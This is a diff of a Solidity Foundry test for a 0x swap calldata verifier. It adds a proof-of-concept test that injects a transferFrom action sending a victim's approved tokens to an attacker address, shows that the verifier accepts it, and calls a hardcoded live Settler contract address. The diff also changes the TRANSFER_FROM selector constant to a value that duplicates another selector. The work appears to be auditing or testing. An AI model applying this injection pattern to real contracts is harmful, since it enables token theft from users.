@@ -5,6 +5,16 @@ import {Test, console} from "forge-std/Test.sol";
 import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {TestERC20} from "./mocks/TestERC20.sol";
+import "forge-std/console.sol";
+
+interface Settler {
+    struct Slippage {
+        address payable recipient;
+        address buyToken;
+        uint256 minOut;
+    }
+    function execute(Slippage calldata slippage, bytes[] calldata actions, bytes32) external payable returns (bool);
+}
 
 contract ZeroXSwapVerifierTest is Test {
     TestERC20 internal token;
@@ -21,7 +31,7 @@ contract ZeroXSwapVerifierTest is Test {
     bytes4 private constant METATXN_VIP = 0xc1fb425e;
     bytes4 private constant CURVE_TRICRYPTO_VIP = 0x103b48be;
     bytes4 private constant UNISWAPV4_VIP = 0x38c9c147;
-    bytes4 private constant TRANSFER_FROM = 0x8d68a156;
+    bytes4 private constant TRANSFER_FROM = 0xc1fb425e;
     bytes4 private constant NATIVE_DEPOSIT = 0xc876d21d;
     bytes4 private constant SELL_TO_LIQUIDITY_PROVIDER = 0xf1e0a1c3;
     bytes4 private constant DODOV1_VIP = 0x40a07c6c;
@@ -362,5 +372,52 @@ contract ZeroXSwapVerifierTest is Test {
             address(0), 
             ""
         );
+    }
+
+    function testCannotInjectRecipient() public {
+        address victim = makeAddr("victim");
+        address attacker = makeAddr("attacker");
+
+        vm.prank(victim);
+        token.approve(spender, 100e18);
+
+        bytes memory action = abi.encodeWithSelector(
+            TRANSFER_FROM,
+            address(token),
+            victim,
+            attacker,
+            100e18
+        );
+    
+        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
+            recipient: address(this),
+            buyToken: address(0),
+            minAmountOut: 0,
+            actions: new bytes[](1)
+        });
+
+        saa.actions[0] = action;
+    
+        bytes memory _calldata = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
+
+        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
+            _calldata,
+            address(this),
+            address(token),
+            1000
+        );
+
+        // this is a problem but only low severity if the settler rejects below
+        assertEq(verified, true);
+
+        Settler.Slippage memory slippage = Settler.Slippage(payable(address(this)), address(token), 0);
+
+        // the settler reverts but because the action is actually ill-defined
+        // we don't know wether this exploit would have went trough or not.
+        Settler(0x207e1074858A7e78f17002075739eD2745dbaEce).execute{gas: 999999999999999999}(slippage, saa.actions, bytes32(0));
+
+
+        assertEq(token.balanceOf(attacker), 100e18);
+
     }
 }
